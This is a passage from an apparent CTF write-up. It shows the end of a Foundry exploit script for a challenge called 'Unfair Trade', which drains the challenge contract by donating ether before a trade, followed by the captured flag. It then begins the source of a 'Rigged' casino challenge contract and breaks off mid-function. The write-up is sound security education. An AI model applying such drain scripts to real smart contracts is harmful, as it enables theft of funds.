+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">TARGET</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">UnfairTradeScript</span> <span class="k">is</span> <span class="n">Script</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ichal</span> <span class="n">chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">user</span> <span class="o">=</span> <span class="mh">0x76F5bb7421393d961e66DaAbB25A936a70dbf32d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span> <span class="o">=</span> <span class="n">Ichal</span><span class="p">(</span><span class="n">ISetup</span><span class="p">(</span><span class="mh">0x283feb83c582953463Ea6FDcFEB1BB6551FE8Ce7</span><span class="p">).</span><span class="n">TARGET</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;challenge contract address&#34;</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">chal</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;contract balance before:&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;user balance before trade:&#34;</span><span class="p">,</span><span class="n">user</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//donate amount to the contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">chal</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">67</span> <span class="kc">ether</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span><span class="s">&#34;donation failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;contract balance after donation:&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">//initiate trade with 30 ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">chal</span><span class="p">.</span><span class="n">trade</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="mi">30</span> <span class="kc">ether</span><span class="p">}();</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;contract balance after:%e&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;user balance after trade :%e&#34;</span><span class="p">,</span><span class="n">user</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After running this script successfully, I accessed the flag.</p>
+<p><strong>Flag is :</strong> <code>PP{d1dn7_533m_7h47_unf41r_70_m3::Xp359wRXrWn1}</code></p>
+<h2 id="3-rigged-">3. Rigged :</h2>
+<h5 id="challenge-description--2">Challenge Description :</h5>
+<p>Playing unregulated online casino games on the blockchain where everyone is trustworthy is a surefire way to lose all your money. Or is it?</p>
+<h5 id="setupsol-2">Setup.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Chal.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Chal</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Create the challenge contract and pass the deployer (msg.sender) as the trusted backend
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Chal</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Require 100 ether to be sent during deployment
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Must send 100 ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Send all the ether to the challenge contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Challenge is solved if the TARGET contract has less than 10 ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="chalsol-2">Chal.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Chal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">casinoBackend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">MIN_BET</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">05</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">MAX_BET</span> <span class="o">=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">nextBetId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">Bet</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">machine</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">games</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">settled</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">won</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">uint256</span> <span class="o">=&gt;</span> <span class="n">Bet</span><span class="p">)</span> <span class="k">public</span> <span class="n">bets</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint8</span><span class="p">)</span> <span class="k">public</span> <span class="n">games</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">BetPlaced</span><span class="p">(</span><span class="kt">uint256</span> <span class="k">indexed</span> <span class="n">id</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">player</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">BetResolved</span><span class="p">(</span><span class="kt">uint256</span> <span class="k">indexed</span> <span class="n">id</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">player</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">won</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Accept a trusted backend address from the deployer (Setup)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">backend</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">casinoBackend</span> <span class="o">=</span> <span class="n">backend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nextBetId</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Accept ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Register a bet — RNG is handled off-chain by the casino RNG service.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">playCoinFlip</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">MIN_BET</span><span class="p">,</span> <span class="s">&#34;Must send ether to flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="n">MAX_BET</span><span class="p">,</span> <span class="s">&#34;Max 1 ether per flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">id</span> <span class="o">=</span> <span class="n">nextBetId</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">machine</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">Bet</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">machine</span><span class="p">,</span> <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetPlaced</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">playBlackJack</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">MIN_BET</span><span class="p">,</span> <span class="s">&#34;Must send ether to flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="n">MAX_BET</span><span class="p">,</span> <span class="s">&#34;Max 1 ether per flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">id</span> <span class="o">=</span> <span class="n">nextBetId</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">machine</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">Bet</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">machine</span><span class="p">,</span> <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetPlaced</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">playRockPaperScissors</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">MIN_BET</span><span class="p">,</span> <span class="s">&#34;Must send ether to flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="n">MAX_BET</span><span class="p">,</span> <span class="s">&#34;Max 1 ether per flip&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">id</span> <span class="o">=</span> <span class="n">nextBetId</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">machine</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">Bet</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">machine</span><span class="p">,</span> <span class="n">games</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetPlaced</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Owner or trusted backend: settle a registered bet with outcome provided by off-chain RNG service.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">settleCoinFlip</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">id</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">random_1_to_10</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">casinoBackend</span><span class="p">,</span> <span class="s">&#34;Only backend can settle&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Bet</span> <span class="k">storage</span> <span class="n">b</span> <span class="o">=</span> <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;Bet not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">b</span><span class="p">.</span><span class="n">settled</span><span class="p">,</span> <span class="s">&#34;Already settled&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">outcome</span> <span class="o">=</span> <span class="p">(</span><span class="n">random_1_to_10</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// effects first
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">b</span><span class="p">.</span><span class="n">settled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">.</span><span class="n">won</span> <span class="o">=</span> <span class="n">outcome</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">outcome</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">payout</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// transfer after state update to mitigate reentrancy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">payable</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">payout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetResolved</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">outcome</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">settleBlackJack</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">id</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">random_1_to_42</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">casinoBackend</span><span class="p">,</span> <span class="s">&#34;Only backend can settle&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Bet</span> <span class="k">storage</span> <span class="n">b</span> <span class="o">=</span> <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;Bet not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">b</span><span class="p">.</span><span class="n">settled</span><span class="p">,</span> <span class="s">&#34;Already settled&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">outcome</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">payout</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">random_1_to_42</span> <span class="o">==</span> <span class="mi">21</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payout</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">amount</span> <span class="o">*</span> <span class="mi">15</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// 3.75x payout for blackjack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">random_1_to_42</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payout</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// effects first
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">b</span><span class="p">.</span><span class="n">settled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">.</span><span class="n">won</span> <span class="o">=</span> <span class="n">outcome</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">outcome</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// transfer after state update to mitigate reentrancy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">payable</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">payout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetResolved</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">outcome</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">settleRockPaperScissors</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">id</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">random_1_to_3</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">casinoBackend</span><span class="p">,</span> <span class="s">&#34;Only backend can settle&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Bet</span> <span class="k">storage</span> <span class="n">b</span> <span class="o">=</span> <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;Bet not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">b</span><span class="p">.</span><span class="n">settled</span><span class="p">,</span> <span class="s">&#34;Already settled&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">outcome</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">payout</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
